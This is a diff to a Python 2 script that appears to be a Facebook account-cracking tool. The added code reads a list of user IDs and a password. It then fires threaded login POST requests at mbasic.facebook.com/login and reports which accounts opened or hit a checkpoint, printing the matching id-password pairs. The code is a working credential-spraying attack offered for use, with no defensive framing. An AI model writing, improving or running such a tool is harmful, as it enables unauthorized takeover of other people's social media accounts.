@@ -1,11 +1,13 @@
 #-*-coding:utf-8-*-
 # Coded By Deray
-'''
-	 Rebuild Copyright Can't make u real programmer
-'''
 # Report Bug On My Other Sosmed
 # instagram: @reyy05_
 # facebook: https://facebook.com/achmad.luthfi.hadi.3
+
+'''
+ Rebuild Copyright Can't make u real programmer:)
+'''
+
 
 import re
 import sys
@@ -14,12 +16,20 @@ import requests
 import threading
 from data.color import *
 from data import cache
+from multiprocessing.pool import  ThreadPool
 cache.cleanCache()
 
+cp=[]
+fo=[]
+fp=0
+ps=""
+sb=""
+lp=""
 initz = 0
 threads = []
 _found = []
 _cekpoin = []
+url="https://mbasic.facebook.com/login"
 
 class asuBrute(threading.Thread):
 	def __init__(self,*args):
@@ -117,3 +127,76 @@ class _prepares:
 			print("\n%sCheckpoint %s"%(warn,len(_cekpoin)))
 			for _ngentot in _cekpoin:
 				print("%s%s%s"%(O,_ngentot,N))
+				
+				
+
+
+class thread:
+	def __init__(self,id):
+		global cp,fo,fp,url,ps,sb,lp
+		r=requests.post(
+			url,data=
+				{
+					"email":id,
+					"pass":ps,
+					"login":sb
+				}
+		).url
+		if "save-device" in r or "m_sess" in r:
+			fo.append("%s -> %s"%(id,ps))
+		if "checkpoint" in r:
+			cp.append("%s -> %s"%(id,ps))
+		else:
+			fp+=1
+			print "\r[%s] cracking %s/%s: found:-%s%s%s   "%(len(cp),fp,len(lp),G,len(fo),N),;sys.stdout.flush()
+				
+
+class prepare:
+	def __init__(self):
+		self.tg()
+		
+	def tg(self):
+		global url,ps,sb,lp
+		try:
+			file=raw_input("[%s+%s] File ID: "%(G,N))
+			self.fail=open(file).readlines()
+			lp=self.fail
+			bs=bs4.BeautifulSoup(
+				requests.get(url).text,
+			features="html.parser")
+			for x in bs("input"):
+				if "login" in x["name"]:
+					sb=x["value"]
+			ps=raw_input("[%s#%s] Password to crack: "%(G,N))
+		except Exception as f:
+			print("%s[!]%s %s"%(R,N,f))
+			return self.tg()
+		self.pol(self.fail)
+	
+	def cek(self):
+		global cp,fo
+		if len(fo) !=0:
+			print "%s[!]%s found: %s"%(G,N,len(fo))
+			for x in fo:
+				print "[%s+%s] %s"%(G,N,x)
+		else:print "%s[:(]%s no result found."%(R,N)
+		if len(cp) !=0:
+			print "\n%s[-]%s checkpoint: %s"%(O,N,len(cp))
+			for x in cp:
+				print "[%s-%s] %s"%(O,N,x)
+					
+	def pol(self,list):
+		global cp,fo
+		try:
+			self.list=list
+			self.p=ThreadPool(input("[%s*%s] Enter Threads: "%(G,N)))
+		except:
+			print("%s[!]%s init is required."%(R,N))
+			return self.pol(self.list)
+		try:
+			self.p.map(thread,self.list)
+			print("\n[%s*%s] finished."%(G,N))
+			self.cek()
+		except:
+			print "\n%s[!]%s something error"%(R,N)
+			self.cek()
